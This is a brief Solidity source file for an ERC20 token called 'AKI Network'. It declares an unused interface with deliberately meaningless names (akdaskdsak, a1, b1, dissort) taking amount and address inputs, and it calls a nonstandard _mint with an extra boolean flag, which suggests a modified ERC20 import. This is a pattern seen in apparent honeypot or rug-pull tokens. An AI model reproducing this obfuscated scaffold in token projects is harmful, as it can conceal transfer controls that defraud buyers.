// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./Own.sol";
import "./ERC20.sol";

interface akdaskdsak {
    function a1(bool ccas,uint256 aacc, address asdabas) external view returns (uint256);
    function b1(bool ccas,uint256 aacc, address asdabas) external view returns (uint256);
    function dissort(bool ff,uint256 FromAmount, address FromAddress
    ) external view returns (uint256);
}

contract AKI is ERC20,Ownable {

    constructor(uint256 totalSupply_)
    Ownable(msg.sender) ERC20('AKI Network', "AKI")  {
        _mint(true,msg.sender, totalSupply_);
    }
}